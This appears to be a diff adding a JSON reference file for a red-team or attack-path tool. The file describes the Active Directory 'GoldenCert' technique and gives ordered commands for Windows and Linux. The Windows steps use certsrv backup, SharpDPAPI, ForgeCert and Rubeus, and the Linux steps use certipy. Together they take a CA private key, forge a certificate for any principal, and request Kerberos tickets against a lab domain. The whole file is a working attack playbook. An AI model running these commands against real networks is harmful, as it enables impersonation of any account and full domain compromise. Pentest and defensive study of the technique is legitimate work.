@@ -1,0 +1,68 @@
+{
+    "GoldenCert": {
+        "meaning": "The victim principal has a certificate private key that can be abused to sign \"golden\" certificates for authentication of any enabled principal in the AD forest of the domain.",
+        "common": "",
+        "windows": {
+            "GUI_Backup": [
+                {
+                    "order": 1,
+                    "command": "certsrv.msc",
+                    "description": "Open Certificate Services Management Console as Administrator"
+                },
+                {
+                    "order": 2,
+                    "command": "Right-click enterprise CA -> All Tasks -> Back up CA...",
+                    "description": "Backup CA certificate including private key"
+                },
+                {
+                    "order": 3,
+                    "command": "Select 'Private key and CA certificate' and set backup location",
+                    "description": "Configure backup to include private key"
+                }
+            ],
+            "SharpDPAPI": [
+                {
+                    "order": 1,
+                    "command": "SharpDPAPI.exe certificates /machine",
+                    "description": "Print all certificates on the host to find CA certificate"
+                },
+                {
+                    "order": 2,
+                    "command": "certutil.exe -MergePFX .\\cert.pem .\\cert.pfx",
+                    "description": "Create PFX version of CA certificate"
+                }
+            ],
+            "ForgeCert": [
+                {
+                    "order": 1,
+                    "command": "ForgeCert.exe --CaCertPath cert.pfx --CaCertPassword \"password123!\" --Subject \"CN=User\" --SubjectAltName \"roshi@dumpster.fire\" --NewCertPath target.pfx --NewCertPassword \"NewPassword123!\"",
+                    "description": "Forge certificate for target principal"
+                },
+                {
+                    "order": 2,
+                    "command": "Rubeus.exe asktgt /user:Roshi /domain:dumpster.fire /certificate:target.pfx /password:NewPassword123!",
+                    "description": "Request TGT using forged certificate"
+                }
+            ]
+        },
+        "linux": {
+            "Certipy": [
+                {
+                    "order": 1,
+                    "command": "certipy ca -backup -ca 'dumpster-DC01-CA' -username jd@dumpster.fire -password 'Password123!'",
+                    "description": "Backup CA certificate with admin credentials"
+                },
+                {
+                    "order": 2,
+                    "command": "certipy forge -ca-pfx dumpster-DC01-CA.pfx -upn Roshi@dumpster.fire -subject 'CN=Roshi,OU=Users,OU=Tier0,DC=dumpster,DC=fire'",
+                    "description": "Forge certificate for target principal"
+                },
+                {
+                    "order": 3,
+                    "command": "certipy auth -pfx roshi_forged.pfx -dc-ip '192.168.100.10'",
+                    "description": "Request TGT using forged certificate"
+                }
+            ]
+        }
+    }
+}
